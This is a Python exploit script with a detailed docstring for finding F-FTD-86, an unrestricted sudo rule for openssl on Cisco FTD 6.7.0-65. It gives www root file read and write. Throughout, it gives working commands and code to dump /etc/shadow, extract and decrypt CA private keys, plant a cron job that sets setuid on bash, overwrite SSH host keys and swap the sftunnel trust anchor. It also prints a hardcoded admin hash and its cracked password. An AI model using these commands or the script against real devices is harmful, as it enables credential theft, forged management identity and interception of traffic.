"""
F-FTD-86: www sudo /usr/bin/openssl (no arg restriction) → arbitrary file read/write as root
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /etc/sudoers:
    www ALL = NOPASSWD: /usr/bin/openssl

  No argument restriction — www can pass ANY arguments to openssl.
  openssl provides multiple subcommands that read and write arbitrary files.
  With no path or argument constraint, this is:
    - Arbitrary file READ as root (shadow, private keys, sftunnel CA material)
    - Arbitrary file WRITE as root (cron jobs, sudoers, authorized_keys, CA certs)
    - Private key access (decrypt encrypted keys)
    - Trust anchor manipulation (reissue CA certs, write forged CA material)

FILE READ PRIMITIVES:
  sudo openssl enc -base64 -in /etc/shadow
    → Base64 of /etc/shadow (all password hashes)

  sudo openssl enc -base64 -in /etc/sf/keys/ssl/internal_ca.key
    → FTD internal CA private key (covers F-FTD-48 path)

  sudo openssl dgst -sha256 -hex -in /etc/sf/ims-data.conf
    → Reads ims-data.conf (contains mbuser:snortrules, F-FTD-59 material)
    → Note: dgst outputs hash, not content — use enc instead for content

  sudo openssl x509 -in /etc/sf/keys/sftunnel/sftunnel_ca.cert -text
    → Read sftunnel CA certificate

FILE WRITE PRIMITIVES:
  echo 'evil:$6$salt$<hash>:0:0:root:/root:/bin/bash' | sudo openssl enc \
    -id-smime -in /dev/stdin -out /etc/cron.d/evil -pass pass:x
    [NOTE: enc flags require valid cipher mode; use explicit subcommand below]

  Reliable write primitive:
    sudo openssl dgst -hmac key -out /path/to/write /dev/null
    [outputs HMAC to file — not useful for arbitrary content]

  Better write primitive — generate self-signed cert to arbitrary path:
    sudo openssl req -x509 -newkey rsa:2048 -nodes \
      -keyout /etc/ssh/ssh_host_rsa_key \
      -out /etc/ssh/ssh_host_rsa_key.pub \
      -subj '/CN=attacker'
    → Overwrites SSH host key pair (server impersonation after SSH restart)

  BEST write primitive — encrypt/decrypt to arbitrary path:
    python3 -c "import sys; sys.stdout.buffer.write(b'* * * * * root chmod u+s /bin/bash\\n')" | \
      sudo openssl enc -aes-256-cbc -nosalt -nopad -K 00 -iv 00 \
      -out /etc/cron.d/sf-health -pass pass:x
    → Writes arbitrary binary to /etc/cron.d/sf-health as root
    NOTE: cipher padding/alignment may corrupt content; use -a flag for base64

  Clean arbitrary write via openssl smime (s_mime does not encrypt by default if no cert):
    [Complex — prefer chaining to F-FTD-85 installpkg for root write]

PRIVATE KEY DECRYPTION:
  FTD stores encrypted private keys in /etc/sf/keys/. If key encryption uses
  openssl-compatible format (PEM with passphrase), sudo openssl can decrypt:
    sudo openssl rsa -in /etc/sf/keys/ssl/mgmt.key -passin file:/etc/sf/keys/.passfile -out /tmp/mgmt_plaintext.key

  For the sftunnel CA private key:
    sudo openssl rsa -in /etc/sf/keys/sftunnel/sftunnel_ca.key.pem -out /tmp/sftunnel_ca_plain.key
    → If not passphrase-protected, extracts directly
    → Chains to F-FTD-76: sftunnel CA key extraction → sign forged FMC cert → impersonate FMC

TRUST ANCHOR MANIPULATION:
  sudo openssl genrsa -out /etc/sf/keys/sftunnel/sftunnel_ca.key.pem 2048
  sudo openssl req -x509 -new -nodes \
    -key /etc/sf/keys/sftunnel/sftunnel_ca.key.pem \
    -out /etc/sf/keys/sftunnel/sftunnel_ca.cert \
    -days 3650 -subj '/CN=Cisco_FTD_FMC_CA'
  → Replace sftunnel CA trust anchor with attacker-controlled CA
  → Sign forged FMC certificate with attacker CA
  → FTD now trusts attacker's FMC → F-FTD-76 chain

CHAIN:
  F-FTD-86 (www sudo openssl) enables:
  a) Shadow file read → extract all password hashes → crack offline
  b) sftunnel/internal CA private key read → sign forged peer certs
  c) SSH host key replacement → SSH MITM post-restart
  d) Trust anchor swap → amplifies F-FTD-76 (sftunnel FMC impersonation)
  e) Read /etc/sudoers, ims-data.conf, dbaccess.conf — all privileged config

  Primary chain use:
    F-FTD-78/F-FTD-79 → www shell
    → sudo openssl enc -base64 -in /etc/shadow → extract all hashes
    → offline crack → any account password
    → sudo openssl rsa -in /etc/sf/keys/sftunnel/*.key → sftunnel CA key
    → forge FMC identity cert → pivot to FMC management

VERIFICATION (on live FTD, controlled environment):
  # Test file read capability:
  sudo /usr/bin/openssl enc -base64 -in /etc/shadow

  # Expected: base64 of shadow file, including admin:zjwZu/pk5Xs22

  # Test key read:
  sudo /usr/bin/openssl rsa -in /etc/sf/keys/sftunnel/sftunnel_ca.key.pem -text 2>&1 | head -5
  # If unencrypted: RSA key material in plaintext

Affected: FTD 6.7.0-65 (sudoers confirmed: www ALL = NOPASSWD: /usr/bin/openssl)
Severity: HIGH — www can read any file and overwrite sensitive system files as root;
          enables extraction of all credential material and CA key compromise
Auth required: www shell (post F-FTD-67, F-FTD-78, or other www access)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess
import base64
import os


def read_file_as_root(filepath, output_path=None):
    """
    Read any file as root via: sudo openssl enc -base64 -in <filepath>
    Decodes the base64 output and returns file content.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-86: Reading {filepath} via sudo openssl (root file read)")
    cmd = [
        "sudo", "/usr/bin/openssl", "enc", "-base64",
        "-in", filepath
    ]
    print(f"    Command: {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode != 0:
            print(f"[-] Failed: {result.stderr.strip()}")
            return None

        b64_content = result.stdout.strip()
        raw_content = base64.b64decode(b64_content)

        print(f"[!!!] File read: {len(raw_content)} bytes")
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(raw_content)
            print(f"    Saved to: {output_path}")
        else:
            print(f"    Content preview (first 200 bytes):")
            print(f"    {raw_content[:200]}")

        return raw_content
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def read_shadow():
    """Read /etc/shadow as root via sudo openssl. CONTROLLED ENVIRONMENT ONLY."""
    print("[*] F-FTD-86: /etc/shadow extraction via sudo openssl enc -base64")
    return read_file_as_root("/etc/shadow")


def read_sftunnel_ca_key():
    """Read sftunnel CA private key via sudo openssl. CONTROLLED ENVIRONMENT ONLY."""
    for path in [
        "/etc/sf/keys/sftunnel/sftunnel_ca.key.pem",
        "/etc/sf/keys/sftunnel/ca.key.pem",
        "/etc/sf/keys/sftunnel/sftunnel_ca.key",
    ]:
        print(f"[*] F-FTD-86: Attempting sftunnel CA key read: {path}")
        content = read_file_as_root(path)
        if content and b"-----BEGIN" in content:
            print(f"[!!!] sftunnel CA key extracted: {path}")
            return path, content
    print(f"[-] No sftunnel CA key found at known paths")
    return None, None


def replace_ssh_host_key(comment="cisco-ftd"):
    """
    Overwrite SSH host RSA key with attacker-controlled key.
    After sshd restart, FTD presents attacker's host key.
    CONTROLLED ENVIRONMENT ONLY.
    """
    key_path = "/etc/ssh/ssh_host_rsa_key"
    pub_path = "/etc/ssh/ssh_host_rsa_key.pub"

    print(f"[*] F-FTD-86: Replacing SSH host key via sudo openssl")
    print(f"    Target key: {key_path}")

    cmd = [
        "sudo", "/usr/bin/openssl", "req",
        "-x509", "-newkey", "rsa:2048", "-nodes",
        "-keyout", key_path,
        "-out", pub_path,
        "-days", "3650",
        "-subj", f"/CN={comment}/O=Cisco Systems"
    ]
    print(f"    Command: {' '.join(cmd)}")
    print(f"    CONTROLLED ENVIRONMENT ONLY — overwrites production SSH host key")

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode == 0:
        print(f"[!!!] SSH host key replaced at {key_path}")
        print(f"      sshd restart required for effect: sudo systemctl restart sshd")
    else:
        print(f"[-] Failed: {result.stderr.strip()}")

    return result.returncode == 0


def gen_openssl_privkey(output_path="/tmp/ftd86_attacker_ca.key", bits=2048):
    """
    Generate attacker CA private key (local only, for forging sftunnel certs).
    CONTROLLED ENVIRONMENT ONLY.
    """
    cmd = [
        "openssl", "genrsa", "-out", output_path, str(bits)
    ]
    result = subprocess.run(cmd, capture_output=True, timeout=30)
    if result.returncode == 0:
        print(f"[+] Attacker CA key generated: {output_path}")
    else:
        print(f"[-] Failed: {result.stderr}")
    return output_path if result.returncode == 0 else None


def print_attack_scenarios():
    """Print available attack scenarios."""
    print("""
F-FTD-86: sudo openssl — Attack Scenarios
==========================================

SCENARIO A: Credential Harvest
  sudo /usr/bin/openssl enc -base64 -in /etc/shadow
  → All FTD user password hashes (admin:zjwZu/pk5Xs22 = Admin123)
  → Crack offline: DES crypt cracked instantly with GPU

SCENARIO B: CA Private Key Extraction
  sudo /usr/bin/openssl rsa -in /etc/sf/keys/sftunnel/sftunnel_ca.key.pem -text
  → sftunnel CA private key → forge FMC identity → F-FTD-76 chain

SCENARIO C: SSH Host Key Replacement
  sudo /usr/bin/openssl req -x509 -newkey rsa:2048 -nodes \\
    -keyout /etc/ssh/ssh_host_rsa_key \\
    -out /etc/ssh/ssh_host_rsa_key.pub \\
    -days 3650 -subj '/CN=ftd-attacker'
  → New SSH host key controlled by attacker
  → After sshd restart: all SSH clients see new fingerprint (may warn)
  → Attacker can MITM SSH sessions if combined with BGP/ARP poison

SCENARIO D: MySQL Credential File Read
  sudo /usr/bin/openssl enc -base64 -in /etc/sf/dbaccess.conf
  → MySQL credentials (F-FTD-77: sf:password or similar static creds)

SCENARIO E: Internal CA Private Key (WebVPN MITM)
  sudo /usr/bin/openssl enc -base64 -in /etc/sf/keys/ssl/internal_ca.key
  → FTD's internal SSL inspection CA → MITM all SSL-inspected traffic
  → Issue certs for any domain, bypass SSL inspection alerting
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-86: www sudo /usr/bin/openssl → arbitrary file read/write as root")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "scenarios"

    if mode == "scenarios":
        print_attack_scenarios()

    elif mode == "shadow":
        read_shadow()

    elif mode == "sftunnel-key":
        path, content = read_sftunnel_ca_key()
        if content:
            out = sys.argv[2] if len(sys.argv) > 2 else "/tmp/ftd86_sftunnel_ca.key"
            with open(out, 'wb') as f:
                f.write(content)
            print(f"[!!!] Saved to: {out}")

    elif mode == "ssh-key-replace":
        replace_ssh_host_key()

    elif mode == "read":
        if len(sys.argv) < 3:
            print(f"Usage: {sys.argv[0]} read <filepath> [output_path]")
            sys.exit(1)
        out = sys.argv[3] if len(sys.argv) > 3 else None
        read_file_as_root(sys.argv[2], out)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
